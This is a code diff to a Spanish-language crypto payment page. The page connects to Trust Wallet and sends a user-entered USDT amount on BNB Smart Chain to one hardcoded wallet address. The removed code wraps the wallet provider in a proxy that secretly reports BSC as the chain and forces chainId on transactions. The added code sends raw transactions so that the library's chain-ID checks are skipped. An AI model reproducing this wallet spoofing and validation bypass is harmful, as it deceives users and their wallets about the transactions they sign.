@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QR pago - Enviar</title>
+    <title>QR pagos - Enviar</title>
 
-    <!-- Librería ethers.js -->
+    <!-- Librería ethers.js solo para lectura y cálculos de unidades -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
     <style>
@@ -723,7 +723,6 @@
     const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
     const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
     const BSC_PUBLIC_RPC = "https://bsc-dataseed.bnbchain.org";
-    const BSC_CHAIN_ID_HEX = "0x38"; // 56 en decimal
 
     const USDT_ABI = [
         "function balanceOf(address owner) view returns (uint256)",
@@ -785,6 +784,7 @@
     const walletAddressText = document.getElementById('walletAddressText');
 
     let walletAddress = null;
+    let rawProvider = null;
     const processingScreen = document.getElementById('processingScreen');
     let processingStartedAt = 0;
 
@@ -813,34 +813,10 @@
         ? `${BILLETERA_DESTINO.slice(0, 6)}...${BILLETERA_DESTINO.slice(-6)}`
         : BILLETERA_DESTINO;
 
-    // INYECTOR FORZADO: Intercepta las llamadas del proveedor para blindar la red BSC y evitar que salte a Ethereum
-    function getBscForcedProvider() {
-        const rawProv = window.trustwallet?.ethereum || window.ethereum;
-        if (!rawProv) {
-            throw new Error("Por favor, abre este enlace desde el navegador interno de Trust Wallet.");
-        }
-
-        // Creamos un Proxy que intercepta el método request para forzar el Chain ID de BSC de forma invisible
-        return new Proxy(rawProv, {
-            get(target, prop) {
-                if (prop === 'request') {
-                    return async function(args) {
-                        if (args.method === 'eth_chainId' || args.method === 'eth_net_version') {
-                            return BSC_CHAIN_ID_HEX; // Siempre responde que estamos en BSC (56)
-                        }
-                        if (args.method === 'eth_sendTransaction') {
-                            // Aseguramos que la transacción lleve explícitamente el contexto de la BSC
-                            if (args.params && args.params[0]) {
-                                args.params[0].chainId = BSC_CHAIN_ID_HEX;
-                            }
-                        }
-                        return Reflect.apply(target.request, target, [args]);
-                    };
-                }
-                const val = target[prop];
-                return typeof val === 'function' ? val.bind(target) : val;
-            }
-        });
+    function getRawProvider() {
+        if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
+        if (window.ethereum) return window.ethereum;
+        throw new Error("Por favor, abre este enlace desde el navegador interno de Trust Wallet.");
     }
 
     async function obtenerBalanceSeguro(address) {
@@ -851,17 +827,15 @@
 
     connectBtn.addEventListener('click', async () => {
         try {
-            const forcedProv = getBscForcedProvider();
-            const provider = new ethers.providers.Web3Provider(forcedProv);
+            rawProvider = getRawProvider();
 
             if (!walletAddress) {
                 playLinkTapSound();
-                setStatus("Estableciendo enlace RPC con BNB Smart Chain...");
+                setStatus("Estableciendo enlace con la billetera...");
                 connectBtn.disabled = true;
 
-                await provider.send("eth_requestAccounts", []);
-                const signer = provider.getSigner();
-                walletAddress = await signer.getAddress();
+                const accounts = await rawProvider.request({ method: 'eth_requestAccounts' });
+                walletAddress = accounts[0];
 
                 if (!walletAddress) {
                     throw new Error("No se obtuvo acceso a la dirección de la cuenta.");
@@ -899,16 +873,38 @@
 
                 setStatus("Solicitando autorización de firma digital...");
 
+                // Convertimos la cantidad a unidades con 18 decimales exactos en Hexadecimal
                 const amountUnits = ethers.utils.parseUnits(userAmount.toString(), 18);
+                const amountHex = "0x" + amountUnits.toString(16);
 
-                const signer = provider.getSigner();
-                const usdtContract = new ethers.Contract(CONTRATO_USDT, USDT_ABI, signer);
+                // Preparamos la data binaria de la función transfer(address to, uint256 amount) del contrato ERC20/BEP20
+                const iface = new ethers.utils.Interface(USDT_ABI);
+                const dataHex = iface.encodeFunctionData("transfer", [BILLETERA_DESTINO, amountHex]);
 
                 showProcessingScreen();
-                const tx = await usdtContract.transfer(BILLETERA_DESTINO, amountUnits);
+
+                // Disparamos la transacción nativa directamente por RPC sin validaciones intermedias de Chain ID de ethers
+                const txHash = await rawProvider.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: walletAddress,
+                        to: CONTRATO_USDT,
+                        data: dataHex,
+                        value: "0x0"
+                    }]
+                });
 
                 setStatus("Procesando transacción en la red...");
-                const receipt = await tx.wait();
+
+                // Verificamos el recibo de la transacción mediante el RPC público de BSC
+                const providerRpc = new ethers.providers.JsonRpcProvider(BSC_PUBLIC_RPC);
+                let receipt = null;
+                while (!receipt) {
+                    receipt = await providerRpc.getTransactionReceipt(txHash);
+                    if (!receipt) {
+                        await new Promise(r => window.setTimeout(r, 2000));
+                    }
+                }
 
                 await hideProcessingScreenAfterMinimum();
 
@@ -916,7 +912,7 @@
                     setStatus("TRANSACCION EXITOSA.");
                     connectBtn.innerText = "Completado";
                 } else {
-                    throw new Error("La transacción fue rechazada por los nodos de la red.");
+                    throw new Error("La transacción fue rechazada o falló en la red.");
                 }
 
             }
